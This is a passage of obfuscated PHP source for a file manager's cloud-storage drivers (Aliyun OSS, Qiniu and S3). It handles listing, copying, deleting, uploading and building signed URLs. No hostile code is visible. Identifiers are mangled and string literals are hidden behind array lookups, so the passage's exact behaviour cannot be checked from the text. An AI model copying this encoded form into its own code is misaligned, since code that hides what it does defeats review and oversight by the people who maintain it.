$¶¿«†‚Ä = $this->link($„¯ñØ÷â, $…ú»…); $this->fileOutLink($¶¿«†‚Ä); } public function fileOutImageServer($¿Çêºø, $äö“´Üä = 250) { parent::fileOutImage($¿Çêºø, $äö“´Üä); } public function fileOutLink($Ó…ó¤µß) { $¿ˆì—˜Î =& $_SERVER[”ôÑ§ì¸]; if (!$this->isCdnHost() && substr($Ó…ó¤µß, 0, 7) == $¿ˆì—˜Î[1361]) { $Ó…ó¤µß = $¿ˆì—˜Î[1362] . substr($Ó…ó¤µß, 7); } header($¿ˆì—˜Î[161] . $Ó…ó¤µß); die; } public function hashMd5($õ„¨ŞÜ, $²¢ÇÖ½Ş = '') { $ûß…¾³˜ =& $_SERVER[”ôÑ§ì¸]; $íÜ¡àÒª = $this->_objectMeta($õ„¨ŞÜ); if (!$íÜ¡àÒª) { return $ûß…¾³˜[12]; } if (!isset($íÜ¡àÒª[$ûß…¾³˜[1415]]) && !empty($²¢ÇÖ½Ş)) { $Õü•İÂ = $this->updateObjMeta($õ„¨ŞÜ, array($ûß…¾³˜[1415] => $²¢ÇÖ½Ş)); $íÜ¡àÒª[$ûß…¾³˜[1415]] = $Õü•İÂ ? $²¢ÇÖ½Ş : $ûß…¾³˜[12]; } return isset($íÜ¡àÒª[$ûß…¾³˜[1415]]) ? strtolower($íÜ¡àÒª[$ûß…¾³˜[1415]]) : $ûß…¾³˜[12]; } public function size($î™½Çæë) { $Äã„à¯á = $this->objectMeta($î™½Çæë); return $Äã„à¯á ? $Äã„à¯á[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function info($õ„Ş‰Ÿ°) { if ($this->isFolder($õ„Ş‰Ÿ°)) { return $this->folderInfo($õ„Ş‰Ÿ°); } else { if ($this->isFile($õ„Ş‰Ÿ°)) { return $this->fileInfo($õ„Ş‰Ÿ°); } } return !1; } public function exist($•Ò¿è€ö) { return $this->isFile($•Ò¿è€ö) || $this->isFolder($•Ò¿è€ö); } public function isFile($Ï¿‹¨÷) { return !$this->isFolder($Ï¿‹¨÷) && $this->objectMeta($Ï¿‹¨÷); } public function isFolder($“Ûşô’–) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][165], $“Ûşô’–); } protected function objectMeta($ÖùğÔŠ) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][167], $ÖùğÔŠ); } protected function _objectMeta($üÅó£ ’) { $Ö«ùº¶ù =& $_SERVER[”ôÑ§ì¸]; try { $©Ø§¤£Ï = $this->client->getObjectMeta($this->bucket, $this->pathEncode($üÅó£ ’)); } catch (OSS\Core\OssException $Ğ‹ĞĞê¹) { $©Ø§¤£Ï = !1; } if ($©Ø§¤£Ï) { $©Ø§¤£Ï[$Ö«ùº¶ù[76]] = intval($©Ø§¤£Ï[$Ö«ùº¶ù[1413]]); } return $©Ø§¤£Ï; } protected function _isFolder($¡¯üÚ˜ò) { $şÅ¥¢öË =& $_SERVER[”ôÑ§ì¸]; if ($¡¯üÚ˜ò == $şÅ¥¢öË[12] || $¡¯üÚ˜ò == $şÅ¥¢öË[8]) { return !0; } $ø¶¢Û¡æ = array($şÅ¥¢öË[1408] => $şÅ¥¢öË[8], $şÅ¥¢öË[1409] => rtrim($¡¯üÚ˜ò, $şÅ¥¢öË[8]) . $şÅ¥¢öË[8], $şÅ¥¢öË[1410] => 1, $şÅ¥¢öË[1411] => $şÅ¥¢öË[12]); $²±˜èà¶ = $this->client->listObjects($this->bucket, $ø¶¢Û¡æ); if ($²±˜èà¶->getObjectList() || $²±˜èà¶->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($™ñœ•Œ) { parent::__construct(); require_once SDK_DIR . $_SERVER[”ôÑ§ì¸][1440]; $this->_init($™ñœ•Œ); } public function _init($Ü¼²òç) { $°Å¬Â¿• =& $_SERVER[”ôÑ§ì¸]; $this->config = $Ü¼²òç; foreach ($Ü¼²òç as $òƒîÃì => $äíßİ‡É) { if (isset($this->{$òƒîÃì})) { $this->{$òƒîÃì} = $äíßİ‡É; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($°Å¬Â¿•[1441] . LNG($°Å¬Â¿•[1399])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Á˜šÖÀó, $’ äëã¢ = '', $ÙşÏÕŞ  = REPEAT_RENAME) { if ($this->setContent($Á˜šÖÀó, $’ äëã¢)) { return $this->getPathOuter($Á˜šÖÀó); } return !1; } public function mkdir($ÄãÖ›¸Ç, $­¿ª¥Å = REPEAT_SKIP) { $¥óêæà¢ =& $_SERVER[”ôÑ§ì¸]; $¸ÑèƒÛ€ = trim($ÄãÖ›¸Ç, $¥óêæà¢[8]); if ($this->_isFolder($¸ÑèƒÛ€)) { return $this->getPathOuter($¸ÑèƒÛ€); } $ÄãÖ›¸Ç = $¸ÑèƒÛ€ . $¥óêæà¢[8]; $Í–²ŞØ¥ = get_path_this($¸ÑèƒÛ€); $…´Ì—¥• = $ÄãÖ›¸Ç . $Í–²ŞØ¥; if (!$this->mkfile($…´Ì—¥•)) { return !1; } if (!$this->moveFile($…´Ì—¥•, $ÄãÖ›¸Ç)) { $this->delFile($…´Ì—¥•); return !1; } return $this->getPathOuter($¸ÑèƒÛ€); } public function copyFile($´íÄÖíÅ, $ŞÍÚ´Ûï) { $‹¶¬ü› = $this->bucketManager->copy($this->bucket, $´íÄÖíÅ, $this->bucket, $ŞÍÚ´Ûï, !0); return $‹¶¬ü› ? !1 : $this->getPathOuter($ŞÍÚ´Ûï); } public function moveFile($†ïôöˆÜ, $µ—Ëö) { $ñ¬¸Óøß = $this->bucketManager->move($this->bucket, $†ïôöˆÜ, $this->bucket, $µ—Ëö, !0); return $ñ¬¸Óøß ? !1 : $this->getPathOuter($µ—Ëö); } public function delFile($”ñ±´ª) { if (!$this->exist($”ñ±´ª)) { return !0; } $ÃÊÁ¯•¸ = $this->bucketManager->delete($this->bucket, $”ñ±´ª); return $ÃÊÁ¯•¸ ? !1 : !0; } public function delFolder($ûœ’øæÒ) { $ÓÇ¿ÓÄÎ =& $_SERVER[”ôÑ§ì¸]; if (!$this->exist($ûœ’øæÒ)) { return !0; } $this->listItemCache = !1; $µÕøş· = $this->fileList($ûœ’øæÒ); $this->listItemCache = !0; $š„ğâÛÖ = trim($ûœ’øæÒ, $ÓÇ¿ÓÄÎ[8]) . $ÓÇ¿ÓÄÎ[8]; if (!empty($ûœ’øæÒ) && $ûœ’øæÒ !== $ÓÇ¿ÓÄÎ[211] && !in_array($š„ğâÛÖ, $µÕøş·[$ÓÇ¿ÓÄÎ[82]])) { $µÕøş·[$ÓÇ¿ÓÄÎ[82]][] = $š„ğâÛÖ; } $Ë‰ÓØè = $this->delByBatch($µÕøş·[$ÓÇ¿ÓÄÎ[83]]); if (!$Ë‰ÓØè) { return !1; } $Ë‰ÓØè = $this->delByBatch($µÕøş·[$ÓÇ¿ÓÄÎ[82]]); if (!$Ë‰ÓØè) { return !1; } return $this->delFile($š„ğâÛÖ); } private function delByBatch($€Ñ¥ğú®) { foreach (array_chunk($€Ñ¥ğú®, 1000) as $Šäáœœª) { $ÏÙ¹ª = $this->bucketManager->buildBatchDelete($this->bucket, $Šäáœœª); list($¹–…¿ûã, $Üİéœä„) = $this->bucketManager->batch($ÏÙ¹ª); if ($Üİéœä„) { return !1; } } return !0; } public function rename($õ•ğÁ’à, $¼ïÀÙîÒ) { return $this->renameObject($õ•ğÁ’à, $¼ïÀÙîÒ); } public function fileInfo($¥šÃ·ÖŸ, $–ÌË—¡À = false, $•è¹¼ÁÙ = array()) { $ÀÑ¿Àö =& $_SERVER[”ôÑ§ì¸]; $øòæ»Ø = array($ÀÑ¿Àö[32] => $this->pathThis($¥šÃ·ÖŸ), $ÀÑ¿Àö[84] => $this->getPathOuter($ÀÑ¿Àö[8] . $¥šÃ·ÖŸ), $ÀÑ¿Àö[33] => $ÀÑ¿Àö[213], $ÀÑ¿Àö[76] => isset($•è¹¼ÁÙ[$ÀÑ¿Àö[1442]]) ? $•è¹¼ÁÙ[$ÀÑ¿Àö[1442]] : 0, $ÀÑ¿Àö[174] => $this->ext($¥šÃ·ÖŸ)); if ($–ÌË—¡À) { return $øòæ»Ø; } $øòæ»Ø[$ÀÑ¿Àö[214]] = $øòæ»Ø[$ÀÑ¿Àö[85]] = 0; $øòæ»Ø[$ÀÑ¿Àö[215]] = $øòæ»Ø[$ÀÑ¿Àö[216]] = !0; if (empty($•è¹¼ÁÙ)) { $•è¹¼ÁÙ = $this->objectMeta($¥šÃ·ÖŸ); if (!$•è¹¼ÁÙ) { return $øòæ»Ø; } } if (isset($•è¹¼ÁÙ[$ÀÑ¿Àö[217]]) && $•è¹¼ÁÙ[$ÀÑ¿Àö[217]]) { $øòæ»Ø[$ÀÑ¿Àö[218]] = $•è¹¼ÁÙ[$ÀÑ¿Àö[217]]; } if (isset($•è¹¼ÁÙ[$ÀÑ¿Àö[227]]) && $•è¹¼ÁÙ[$ÀÑ¿Àö[227]]) { $øòæ»Ø[$ÀÑ¿Àö[218]] = $•è¹¼ÁÙ[$ÀÑ¿Àö[227]]; } if (isset($•è¹¼ÁÙ[$ÀÑ¿Àö[1443]])) { $øòæ»Ø[$ÀÑ¿Àö[85]] = substr($•è¹¼ÁÙ[$ÀÑ¿Àö[1443]] . $ÀÑ¿Àö[12], 0, 10); } if (isset($•è¹¼ÁÙ[$ÀÑ¿Àö[1442]])) { $øòæ»Ø[$ÀÑ¿Àö[76]] = $•è¹¼ÁÙ[$ÀÑ¿Àö[1442]]; } return $øòæ»Ø; } public function folderInfo($ùÓœÖÃ , $Ó”ÍŸÒ = false) { $ß¾ñ¯– =& $_SERVER[”ôÑ§ì¸]; $¥ŞèÊ­ = array($ß¾ñ¯–[32] => $this->pathThis($ùÓœÖÃ ), $ß¾ñ¯–[84] => $this->getPathOuter($ß¾ñ¯–[8] . $ùÓœÖÃ ), $ß¾ñ¯–[33] => $ß¾ñ¯–[75]); if ($Ó”ÍŸÒ) { return $¥ŞèÊ­; } $¥ŞèÊ­[$ß¾ñ¯–[214]] = $¥ŞèÊ­[$ß¾ñ¯–[85]] = 0; $¥ŞèÊ­[$ß¾ñ¯–[215]] = $¥ŞèÊ­[$ß¾ñ¯–[216]] = !0; $ùÓœÖÃ  = rtrim($ùÓœÖÃ , $ß¾ñ¯–[8]) . $ß¾ñ¯–[8]; $Š™“ù‘ø = $this->objectMeta($ùÓœÖÃ ); if (isset($Š™“ù‘ø[$ß¾ñ¯–[1443]])) { $¥ŞèÊ­[$ß¾ñ¯–[85]] = substr($Š™“ù‘ø[$ß¾ñ¯–[1443]] . $ß¾ñ¯–[12], 0, 10); } return $¥ŞèÊ­; } public function listPath($Å¼ğòº—, $êì¼·Š­ = false) { $ÀÎ‰–íĞ =& $_SERVER[”ôÑ§ì¸]; $ÈÅø™É = $this->fileList($Å¼ğòº—, $ÀÎ‰–íĞ[8], !0); foreach ($ÈÅø™É[$ÀÎ‰–íĞ[82]] as $µÃÍóŒ => $‘„¹‡ìó) { $ÈÅø™É[$ÀÎ‰–íĞ[82]][$µÃÍóŒ] = $this->folderInfo($‘„¹‡ìó, $êì¼·Š­); } foreach ($ÈÅø™É[$ÀÎ‰–íĞ[83]] as $µÃÍóŒ => $‘„¹‡ìó) { $ÈÅø™É[$ÀÎ‰–íĞ[83]][$µÃÍóŒ] = $this->fileInfo($‘„¹‡ìó[$ÀÎ‰–íĞ[94]], $êì¼·Š­, $‘„¹‡ìó); } return $ÈÅø™É; } public function has($ô™Å÷ã, $€ãëà İ = false, $ªàµÆºÛ = true) { $…ÑŠĞŞš =& $_SERVER[”ôÑ§ì¸]; $ô™Å÷ã = trim($ô™Å÷ã, $…ÑŠĞŞš[8]); $¡¡ƒë¾¹ = empty($ô™Å÷ã) && $ô™Å÷ã !== $…ÑŠĞŞš[211] ? $…ÑŠĞŞš[12] : $ô™Å÷ã . $…ÑŠĞŞš[8]; $íéº™Òœ = $…ÑŠĞŞš[12]; $æêäàš™ = 500; $”¼£ÄÙõ = $…ÑŠĞŞš[8]; $Ã‡µ’Ğ— = $½ÄºšˆÖ = 0; while (!0) { check_abort(); list($øÓ¦âÇò, $‰¸ÄÅ³€) = $this->bucketManager->listFiles($this->bucket, $¡¡ƒë¾¹, $íéº™Òœ, $æêäàš™, $”¼£ÄÙõ); if ($‰¸ÄÅ³€) { break; } $íéº™Òœ = array_key_exists($…ÑŠĞŞš[1411], $øÓ¦âÇò) ? $íéº™Òœ = $øÓ¦âÇò[$…ÑŠĞŞš[1444]] : $…ÑŠĞŞš[12]; if ($€ãëà İ) { if (!empty($øÓ¦âÇò[$…ÑŠĞŞš[1445]])) { $Ã‡µ’Ğ— += count($øÓ¦âÇò[$…ÑŠĞŞš[1445]]); } if (!empty($øÓ¦âÇò[$…ÑŠĞŞš[1446]])) { $½ÄºšˆÖ += count($øÓ¦âÇò[$…ÑŠĞŞš[1446]]); } if ($íéº™Òœ === $…ÑŠĞŞš[12]) { break; } continue; } if ($ªàµÆºÛ) { if (!empty($øÓ¦âÇò[$…ÑŠĞŞš[1445]])) { return !0; } } else { if (!empty($øÓ¦âÇò[$…ÑŠĞŞš[1446]])) { return !0; } } if ($íéº™Òœ === $…ÑŠĞŞš[12]) { break; } } if ($€ãëà İ) { return array($…ÑŠĞŞš[222] => $Ã‡µ’Ğ—, $…ÑŠĞŞš[223] => $½ÄºšˆÖ); } return !1; } public function listAll($»€­²ã) { $ÁŒÓˆ‰ë =& $_SERVER[”ôÑ§ì¸]; $éûš®øİ = $this->fileList($»€­²ã, $ÁŒÓˆ‰ë[12], !0); $ä´¨Œ = array_to_keyvalue($éûš®øİ[$ÁŒÓˆ‰ë[83]], $ÁŒÓˆ‰ë[32]); foreach ($éûš®øİ[$ÁŒÓˆ‰ë[82]] as $íµº§à) { if (is_string($íµº§à)) { $ä´¨Œ[$íµº§à] = array($ÁŒÓˆ‰ë[76] => 0); } } return $this->listAllFiles($»€­²ã, $ä´¨Œ); } private function fileList($ìœêÊğ·, $‚¯Ì¼ß = '', $úı ¬¥ = 0) { $­Ü—üÉÜ =& $_SERVER[”ôÑ§ì¸]; $ìœêÊğ· = trim($ìœêÊğ·, $­Ü—üÉÜ[8]); $§ô¢Ôàô = empty($ìœêÊğ·) && $ìœêÊğ· !== $­Ü—üÉÜ[211] ? $­Ü—üÉÜ[12] : $ìœêÊğ· . $­Ü—üÉÜ[8]; $»Ä«‘ë¹ = $­Ü—üÉÜ[12]; $Ò²À® ˆ = 1000; $ÚÚ®êŒ’ = $Ã¥ÃæÕª = array(); while (!0) { check_abort(); list($æÄ»÷Êƒ, $°½êÌü») = $this->bucketManager->listFiles($this->bucket, $§ô¢Ôàô, $»Ä«‘ë¹, $Ò²À® ˆ, $‚¯Ì¼ß); if ($°½êÌü») { break; } $»Ä«‘ë¹ = array_key_exists($­Ü—üÉÜ[1411], $æÄ»÷Êƒ) ? $»Ä«‘ë¹ = $æÄ»÷Êƒ[$­Ü—üÉÜ[1444]] : $­Ü—üÉÜ[12]; $«æ˜Ş³ = isset($æÄ»÷Êƒ[$­Ü—üÉÜ[1445]]) ? $æÄ»÷Êƒ[$­Ü—üÉÜ[1445]] : array(); $¥û‹¨“¯ = isset($æÄ»÷Êƒ[$­Ü—üÉÜ[1446]]) ? $æÄ»÷Êƒ[$­Ü—üÉÜ[1446]] : array(); foreach ($«æ˜Ş³ as $§ğ­–çš) { if ($§ğ­–çš[$­Ü—üÉÜ[94]] == $§ô¢Ôàô) { continue; } $‹˜³áˆá = $§ğ­–çš[$­Ü—üÉÜ[94]]; $”Û¬îâº = $§ğ­–çš[$­Ü—üÉÜ[1442]]; $§ğ­–çš[$­Ü—üÉÜ[76]] = $”Û¬îâº; $¤áñÑìØ = $”Û¬îâº == 0 && substr($‹˜³áˆá, strlen($‹˜³áˆá) - 1, 1) == $­Ü—üÉÜ[8] ? !0 : !1; $this->cacheMethodInfoSet($‹˜³áˆá, $¤áñÑìØ, $§ğ­–çš); if ($¤áñÑìØ) { $ÚÚ®êŒ’[] = $‹˜³áˆá; continue; } $Ã¥ÃæÕª[] = $úı ¬¥ ? $§ğ­–çš : $‹˜³áˆá; } foreach ($¥û‹¨“¯ as $‹˜³áˆá) { if ($‹˜³áˆá == $§ô¢Ôàô) { continue; } $ÚÚ®êŒ’[] = $‹˜³áˆá; $this->cacheMethodInfoSet($‹˜³áˆá, !0); } if ($»Ä«‘ë¹ === $­Ü—üÉÜ[12]) { break; } } $this->cacheMethodInfoSet($ìœêÊğ·, !0); return array($­Ü—üÉÜ[82] => $ÚÚ®êŒ’, $­Ü—üÉÜ[83] => $Ã¥ÃæÕª); } public function canRead($àõĞ³–) { return $this->exist($àõĞ³–) ? !0 : !1; } public function canWrite($½ãäãÁ) { return $this->exist($½ãäãÁ) ? !0 : !1; } public function getContent($ Æ›Óš) { return $this->fileSubstr($ Æ›Óš, 0, -1); } public function setContent($ï¥³ÜÙ„, $Æ–ÀèøÎ = '') { $„‘Úªã = $this->tempFile($this->pathThis($ï¥³ÜÙ„)); file_put_contents($„‘Úªã, $Æ–ÀèøÎ); if ($this->upload($ï¥³ÜÙ„, $„‘Úªã)) { $this->tempFileRemve($„‘Úªã); return !0; } return !1; } public function refreshUrls($’®´º·•) { $‡ƒ¦ã =& $_SERVER[”ôÑ§ì¸]; $¿÷¿Ãû¢ = array(); if (is_array($’®´º·•)) { foreach ($’®´º·• as $¹š¾¾«Ê) { $¿÷¿Ãû¢[] = $this->link($¹š¾¾«Ê); } } else { $¿÷¿Ãû¢[] = $this->link($’®´º·•); } $“ã„–òó = new Qiniu\Cdn\CdnManager($this->auth); list($½Ü± õñ, $ø±Œ¯Š) = $“ã„–òó->refreshUrls($¿÷¿Ãû¢); if ($ø±Œ¯Š) { return !1; } return $½Ü± õñ[$‡ƒ¦ã[1213]] == $‡ƒ¦ã[781] ? !0 : !1; } public function fileSubstr($…¹ùÛåÆ, $¾ŞÙÆ®¥, $Å†ĞğÇõ) { $ŞÑ»Á¸º =& $_SERVER[”ôÑ§ì¸]; if (!($Ë–£à¥œ = $this->link($…¹ùÛåÆ))) { return !1; } $ëÑ“’ = !1; if ($Å†ĞğÇõ > 0) { $”Çæ¢Ëø = $¾ŞÙÆ®¥ + $Å†ĞğÇõ - 1; $ëÑ“’ = array($ŞÑ»Á¸º[1447] . $¾ŞÙÆ®¥ . $ŞÑ»Á¸º[429] . $”Çæ¢Ëø); } $¨ƒ ®µ = url_request($Ë–£à¥œ, $ŞÑ»Á¸º[244], !1, $ëÑ“’); return $¨ƒ ®µ[$ŞÑ»Á¸º[772]] ? $¨ƒ ®µ[$ŞÑ»Á¸º[1233]] : !1; } public function upload($ùøëƒâ€, $Ôòœï¯Š, $È¾ş­ƒŸ = false, $™Âè”Ê· = REPEAT_REPLACE) { $µÂÔ¾ñø = new Qiniu\Storage\UploadManager(); $¨ı”³ñ¬ = $this->auth->uploadToken($this->bucket, $ùøëƒâ€); $ªàÑºò = get_file_mime(get_path_ext($Ôòœï¯Š)); list($•ßé¶¹í, $ÖªÍÎîú) = $µÂÔ¾ñø->putFile($¨ı”³ñ¬, $ùøëƒâ€, $Ôòœï¯Š, null, $ªàÑºò); return $ÖªÍÎîú ? !1 : $this->getPathOuter($ùøëƒâ€); } public function uploadFormData($°½ªêŠˆ, $øŸ­š½á = 3600) { return $this->uploadToken($°½ªêŠˆ, $øŸ­š½á); } public function multiUploadFormData($ñşºï, $øÅÌÔê» = 3600) { return $this->uploadToken($ñşºï, $øÅÌÔê»); } private function uploadToken($Ûˆ˜”üû, $é‰ğ¾ = 3600) { $›šÂÖ«ã =& $_SERVER[”ôÑ§ì¸]; $º¥Ÿ‘— = $é‰ğ¾; $¶‡ÒùŒ® = array($›šÂÖ«ã[1448] => $›šÂÖ«ã[1449]); $¥¢ºÛÃÄ = $Ûˆ˜”üû; $”Œ€ÇÖ¡ = $this->auth->uploadToken($this->bucket, $¥¢ºÛÃÄ, $º¥Ÿ‘—, $¶‡ÒùŒ®, !0); $ëšå›»‚ = empty($this->region) || $this->region == $›šÂÖ«ã[1450] ? $›šÂÖ«ã[12] : $›šÂÖ«ã[429] . $this->region; $£èğ›È¯ = http_type() . "\x3a\x2f\x2f\165\x70\154\157\x61\x64{$ëšå›»‚}\56\161\151\156\x69\165\x70\x2e\x63\157\x6d\57"; return array($›šÂÖ«ã[1451] => $”Œ€ÇÖ¡, $›šÂÖ«ã[1452] => $£èğ›È¯); } public function download($Â¶ÆÑÆ², $äªÏô®Ç) { $ÉÂğàã“ = IO::getPathInner(IO::mkfile($äªÏô®Ç)); if (!($Šæ×ù‰ü = $this->link($Â¶ÆÑÆ²))) { return !1; } $çÍÒè = 0; $ñ©‡²×æ = 1024 * 200; $Õé›ÃÑ = fopen($ÉÂğàã“, $_SERVER[”ôÑ§ì¸][1453]); while (!0) { $£ÒüÛ®ì = $this->fileSubstr($Â¶ÆÑÆ², $çÍÒè, $ñ©‡²×æ); if ($£ÒüÛ®ì === !1) { return !1; } fwrite($Õé›ÃÑ, $£ÒüÛ®ì); $çÍÒè += $ñ©‡²×æ; if (strlen($£ÒüÛ®ì) < $ñ©‡²×æ) { break; } } fclose($Õé›ÃÑ); return $äªÏô®Ç; } public function link($Ë“Ó…™›, $Üú¸í¸æ = '') { if (!$this->isFile($Ë“Ó…™›)) { return !1; } $å¤ü÷’Ó = $this->getHost() . $_SERVER[”ôÑ§ì¸][8] . $this->pathEncode($Ë“Ó…™›) . $Üú¸í¸æ; return $this->auth->privateDownloadUrl($å¤ü÷’Ó, 3600 * 12); } public function fileOut($óè”èûÁ, $îİ·­‡ = false, $±î˜õö€ = false, $–Á­¸ó‹ = '') { $š€ĞË€ =& $_SERVER[”ôÑ§ì¸]; if ($this->isFileOutServer()) { return $this->fileOutServer($óè”èûÁ, $îİ·­‡, $±î˜õö€, $–Á­¸ó‹); } if (!$±î˜õö€) { $±î˜õö€ = $this->pathThis($óè”èûÁ); } $…†ÕË¯® = $îİ·­‡ ? $š€ĞË€[1454] . rawurlencode($±î˜õö€) : $š€ĞË€[12]; $Úïƒ«ÛÇ = $this->link($óè”èûÁ, $…†ÕË¯®); $this->fileOutLink($Úïƒ«ÛÇ); } public function fileOutServer($»íˆÌËÈ, $ëõ¡’Ò = false, $±¬À‘à = false, $ˆÌ±ö”œ = '') { parent::fileOut($»íˆÌËÈ, $ëõ¡’Ò, $±¬À‘à, $ˆÌ±ö”œ); } public function fileOutImage($‚èü²å, $ô¤Î¶É = 250) { $©ŞÂ‘‚— = $this->link($‚èü²å, $_SERVER[”ôÑ§ì¸][1455] . $ô¤Î¶É); $this->fileOutLink($©ŞÂ‘‚—); } public function fileOutImageServer($¦Š¨Ä·Á, $ßå˜ë«² = 250) { parent::fileOutImage($¦Š¨Ä·Á, $ßå˜ë«²); } public function hashMd5($·¾ô¥³´) { $¾ùòãë§ =& $_SERVER[”ôÑ§ì¸]; $ÖĞĞÏİ = $this->objectMeta($·¾ô¥³´); return isset($ÖĞĞÏİ[$¾ùòãë§[227]]) ? $ÖĞĞÏİ[$¾ùòãë§[227]] : !1; $ïØ ûòÄ = $this->link($·¾ô¥³´, $¾ùòãë§[1456]); } public function size($²í¸ü¼‘) { $×¼«¼Ç• = $this->objectMeta($²í¸ü¼‘); return $×¼«¼Ç• ? $×¼«¼Ç•[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function info($¹¡öË•½) { if ($this->isFolder($¹¡öË•½)) { return $this->folderInfo($¹¡öË•½); } else { if ($this->isFile($¹¡öË•½)) { return $this->fileInfo($¹¡öË•½); } } return !1; } public function exist($‹±±Ë±) { return $this->isFile($‹±±Ë±) || $this->isFolder($‹±±Ë±); } public function isFile($š¸£™Êè) { return !$this->isFolder($š¸£™Êè) && $this->objectMeta($š¸£™Êè); } public function isFolder($˜ƒíÎ£¿) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][165], $˜ƒíÎ£¿); } protected function objectMeta($ƒÊÕÛÔ) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][167], $ƒÊÕÛÔ); } protected function _objectMeta($¾Úı§öÇ) { $«ƒ–¦ßè =& $_SERVER[”ôÑ§ì¸]; list($ÂÙó‹¬™, $»”·çÄ») = $this->bucketManager->stat($this->bucket, $¾Úı§öÇ); if ($ÂÙó‹¬™) { $ÂÙó‹¬™[$«ƒ–¦ßè[76]] = intval($ÂÙó‹¬™[$«ƒ–¦ßè[1442]]); } return $ÂÙó‹¬™; } protected function _isFolder($Ù‚ş»«Ê) { $º««·‹ =& $_SERVER[”ôÑ§ì¸]; if ($Ù‚ş»«Ê == $º««·‹[12] || $Ù‚ş»«Ê == $º««·‹[8]) { return !0; } list($¨¨À’Î¸, $ÎÙİšËğ) = $this->bucketManager->listFiles($this->bucket, trim($Ù‚ş»«Ê, $º««·‹[8]) . $º««·‹[8], $º««·‹[12], 1, $º««·‹[8]); return !empty($¨¨À’Î¸[$º««·‹[1445]]) || !empty($¨¨À’Î¸[$º««·‹[1446]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($İ°÷Ù•) { parent::__construct($İ°÷Ù•); } public function uploadFormData($•èîÇÁ€, $˜ØÌİİù = 3600) { $ó©éà’– =& $_SERVER[”ôÑ§ì¸]; $øÊ«‚¯ = $ó©éà’–[212]; $¤¸´ÁÁš = $ó©éà’–[252]; $Ú›Ñ»¨‹ = $ó©éà’–[62]; $‚ïŞá = gmdate($ó©éà’–[253]); $½­±¾×Ë = gmdate($ó©éà’–[254]); $Øäİ·®¬ = $ó©éà’–[255]; $úÛ÷Ÿâ± = $˜ØÌİİù . $ó©éà’–[12]; $ˆüÑ§•™ = $ó©éà’–[256]; $æı•âĞ = array($this->accessKey, $½­±¾×Ë, $this->region, $Ú›Ñ»¨‹, $Øäİ·®¬); $İæÄÃÍ° = implode($ó©éà’–[8], $æı•âĞ); $Ñ¬€‘‰ = array($ó©éà’–[257] => gmdate($ó©éà’–[1355], strtotime($ó©éà’–[259])), $ó©éà’–[260] => array(array($ó©éà’–[261] => $this->bucket), array($ó©éà’–[262] => $øÊ«‚¯), array($ó©éà’–[263], $ó©éà’–[264], $ó©éà’–[12]), array($ó©éà’–[263], $ó©éà’–[265], $ó©éà’–[12]), array($ó©éà’–[263], $ó©éà’–[266], $ó©éà’–[12]), array($ó©éà’–[267] => $ˆüÑ§•™), array($ó©éà’–[268] => $İæÄÃÍ°), array($ó©éà’–[269] => $¤¸´ÁÁš), array($ó©éà’–[270] => $‚ïŞá), array($ó©éà’–[271] => $úÛ÷Ÿâ±))); $¸–“”¥İ = base64_encode(json_encode($Ñ¬€‘‰)); $˜æ‡‘Ğù = hash_hmac($ó©éà’–[272], $½­±¾×Ë, $ó©éà’–[273] . $this->secret, !0); $óÀ¢·‡ñ = hash_hmac($ó©éà’–[272], $this->region, $˜æ‡‘Ğù, !0); $Şö½ªšø = hash_hmac($ó©éà’–[272], $Ú›Ñ»¨‹, $óÀ¢·‡ñ, !0); $ßĞÑæè = hash_hmac($ó©éà’–[272], $Øäİ·®¬, $Şö½ªšø, !0); $Û¥û Úá = hash_hmac($ó©éà’–[272], $¸–“”¥İ, $ßĞÑæè); $Ù‘Ê×ÁŒ = array($ó©éà’–[229] => $ó©éà’–[12], $ó©éà’–[274] => $ó©éà’–[12], $ó©éà’–[262] => $øÊ«‚¯, $ó©éà’–[267] => $ˆüÑ§•™, $ó©éà’–[275] => $¸–“”¥İ, $ó©éà’–[276] => $İæÄÃÍ°, $ó©éà’–[277] => $¤¸´ÁÁš, $ó©éà’–[278] => $‚ïŞá, $ó©éà’–[279] => $úÛ÷Ÿâ±, $ó©éà’–[280] => $Û¥û Úá, $ó©éà’–[195] => $this->getHost()); return $Ù‘Ê×ÁŒ; } public function multiUploadFormData($«³Ì§Ù†, $©ˆ·ïù¿ = 3600) { $›®ªäˆ› =& $_SERVER[”ôÑ§ì¸]; $æÍÇ¥Œ– = gmdate($›®ªäˆ›[1457]); $Çş€¥îÏ = array(); $ñ¡Çú¾ = $this->client->getUploadId($this->bucket, $«³Ì§Ù†, $Çş€¥îÏ); if (!$ñ¡Çú¾) { return !1; } return array($›®ªäˆ›[237] => $ñ¡Çú¾, $›®ªäˆ›[195] => $this->getHost() . $›®ªäˆ›[8] . $this->pathEncode($«³Ì§Ù†), $›®ªäˆ›[238] => $æÍÇ¥Œ–, $›®ªäˆ›[94] => $«³Ì§Ù†); } public function multiUploadAuthData($¼úèÜÜª, $É’òÛ­Š = array()) { $Õ½â©» =& $_SERVER[”ôÑ§ì¸]; $•–¿•Ú± = isset($É’òÛ­Š[$Õ½â©»[174]]) ? $É’òÛ­Š[$Õ½â©»[174]] : $Õ½â©»[12]; $ñóì¡ÚÆ = $É’òÛ­Š[$Õ½â©»[94]]; unset($É’òÛ­Š[$Õ½â©»[94]]); if (isset($É’òÛ­Š[$Õ½â©»[239]])) { return $this->listUploadParts($ñóì¡ÚÆ, $É’òÛ­Š); } $Óšç½»ç = array(); if (isset($É’òÛ­Š[$Õ½â©»[1458]])) { $Óšç½»ç[$Õ½â©»[1459]] = $É’òÛ­Š[$Õ½â©»[1458]]; } $ÑÂ›îîÇ = 